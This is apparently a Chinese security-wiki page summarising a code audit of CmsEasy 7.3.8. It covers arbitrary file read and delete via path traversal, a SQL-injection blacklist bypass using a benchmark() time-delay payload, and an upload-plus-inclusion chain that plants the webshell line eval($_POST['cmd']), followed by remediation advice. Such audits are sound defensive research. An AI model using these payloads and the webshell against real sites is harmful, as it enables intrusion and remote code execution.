---
title: CmsEasy 7.3.8 代码审计：任意文件操作、SQL注入黑名单绕过及LFI到RCE利用链
description: 深度分析 CmsEasy 7.3.8 版本中发现的任意文件读取/写入/删除、SQL注入黑名单绕过（benchmark替代sleep）、以及本地文件包含结合上传功能实现RCE的完整漏洞链条。
category: ai-security
tags:
- CmsEasy
- 代码审计
- 任意文件操作
- SQL注入
- 黑名单绕过
- LFI
- RCE
- CMS漏洞
- PHP
date: '2020-02-09'
updated: '2026-11-12'
---
## 概述

本页面记录对 **CmsEasy 7.3.8**（发布于 2019-12-30）的代码审计过程与发现。该系统为半开源企业建站管理系统，核心代码经加密混淆。审计共挖掘三类高危漏洞：**任意文件操作（读/写/删）**、**SQL注入（黑名单绕过）**、**本地文件包含至远程代码执行（LFI→RCE）完整利用链**。官方已于 2020-02-09 发布 V7.5.3 修复版本。

> **关联背景**：CMS 类应用常因模板编辑、语言包管理等功能引入文件操作与包含风险，参考 [[zzzcms-v1.7.5-audit]]、[[zzzphp-cve-2021-32605-rce]]、[[tctf-2021-1linephp-zip-include]] 中的类似审计案例。

---

## 任意文件操作（读 / 写 / 删）

### 漏洞成因
后台“模板编辑”功能允许用户通过 `id` 参数指定模板文件路径，后端未做路径规范化与权限校验，直接拼接读取、写入或删除。

### 攻击面定位
- **读取**：`/admin/template_design.php?action=fetch&id=../../../etc/passwd`
- **删除**：经逆向混淆代码定位到 `del_file()` 函数，`filepath` 可控
- **写入**：同理存在 `save_file()` 类似逻辑（文中未展开）

### 关键代码片段（解混淆后）
```php
// 删除功能伪代码
function del_file($filepath) {
    @unlink($filepath);   // 无过滤，直接删除
}
```

### 利用验证
黑盒修改 `id` 参数即可读取任意文件；结合目录遍历可删除任意文件导致 DoS 或覆盖关键配置。

> **同类模式**：[[ecshop-414-sql-injection-analysis]] 中亦通过可控参数触发深层逻辑漏洞。

---

## SQL 注入与黑名单绕过

### 漏洞位置
`lib/admin/language_admin.php` 中的 `add_action()` 与 `edit_action()` 函数。

### 过滤机制分析
框架内置 SQL 注入检测函数（定义于加密核心文件），黑名单包含：`select`、`*`、`sleep`、`union` 等关键字。

```php
// 解混淆后的检测函数伪代码
function check_sql_inject($str) {
    $blacklist = ['select', '*', 'sleep', 'union', 'benchmark', ...];
    foreach ($blacklist as $kw) {
        if (stripos($str, $kw) !== false) return true;
    }
    return false;
}
```

### 绕过技巧
- **时间盲注替代函数**：`sleep()` 被拦截，改用 `benchmark(10000000, md5(1))` 造成延时
- **编码/大小写变形**：部分关键字未全覆盖
- **注释截断**：利用 `/**/` 内联绕过简单字符串匹配

### 验证 Payload 示例
```http
POST /admin/language_admin.php?action=add
lang_name=test' AND benchmark(10000000,md5(1))-- -
```

> **对比参考**：[[mtctf-2021-web-writeup]] 中亦涉及 SQL 注入黑名单绕过（反斜杠转义、数值型布尔盲注）。

---

## LFI 到 RCE 完整利用链

### 漏洞入口
同一文件 `language_admin.php` 的 `edit_action()` 函数：

```php
$lang_choice = $_GET['lang_choice'];          // 可控
$langurlname = $db->get_one("SELECT langurlname FROM ...); // 从库读取
$path = ROOT_PATH . 'lang/' . $langurlname . '/' . $lang_choice; // 拼接
// ...
if (!isset($_POST['submit'])) {               // 可通过不传 submit 绕过
    include $path;                            // 直接包含
}
```

### 利用链构造
1. **上传恶意图片**：前台/后台上传功能允许上传图片（如 `shell.jpg`），内容嵌入 PHP 代码 `<?php eval($_POST['cmd']); ?>`
2. **控制包含路径**：通过 `lang_choice=../../../upload/image/20200101/shell.jpg` 实现跨目录包含
3. **触发 RCE**：访问包含接口即执行嵌入代码，获取 WebShell

### 关键条件
- `$lang_choice` 位于路径末尾，可目录穿越
- `submit` 参数缺失即跳过保存逻辑直达 `include`
- 上传目录可预测/遍历，且解析策略允许包含非 `.php` 后缀

> **同类利用链**：[[tctf-2021-1linephp-zip-include]] 利用 `zip://` 协议包含临时文件/Session 实现 RCE；[[spring-boot-devtools-deserialization-rce]] 通过弱默认密钥触发反序列化 RCE。

---

## 审计方法论小结

| 阶段 | 技术要点 | 工具/手段 |
|------|----------|-----------|
| **攻击面枚举** | 关注模板编辑、语言包、文件上传等功能 | 目录扫描、功能点梳理 |
| **混淆代码逆向** | 核心过滤函数隐于加密文件 | 动态调试、Hook 关键函数、特征搜索 |
| **黑名单绕过** | Fuzzing 验证过滤规则、寻找替代函数 | 自动化 Fuzz、手工构造 Payload |
| **链式利用** | 组合上传 + 包含 + 逻辑绕过 | 构造完整攻击链、验证落地 |

### 经验启示
1. **半开源/闭源 ≠ 安全**：加密反而掩盖了危险函数，审计需动静结合
2. **污点传播视角**：文件操作、包含、SQL 拼接均为典型污点汇聚点，适合自动化发现
3. **防御建议**：
   - 路径规范化 + 白名单校验
   - 参数化查询替代黑名单
   - 上传文件重命名、存储隔离、禁用脚本解析

---

## 版本时间线

| 版本 | 发布日期 | 状态 |
|------|----------|------|
| 7.3.8 | 2019-12-30 | 存在上述漏洞 |
| 7.5.3 | 2020-02-09 | 官方修复版本 |

---

## 相关页面

- [[zzzcms-v1.7.5-audit]] — 另一 PHP CMS 审计案例（SSRF、SQLi、模板注入 RCE）
- [[mtctf-2021-web-writeup]] — CTF 实战中的 SQLi 绕过、PHP 反序列化、Session Upload Progress 利用
- [[tctf-2021-1linephp-zip-include]] — ZIP 协议包含临时文件实现 RCE
- [[ecshop-414-sql-injection-analysis]] — ECShop SQL 注入利用链分析
- [[spring-boot-devtools-deserialization-rce]] — Spring Boot 弱默认密钥导致反序列化 RCE

## 来源

- [0th3rs安全团队-201911-202204_075](../sources/0th3rs安全团队-201911-202204_075.md)
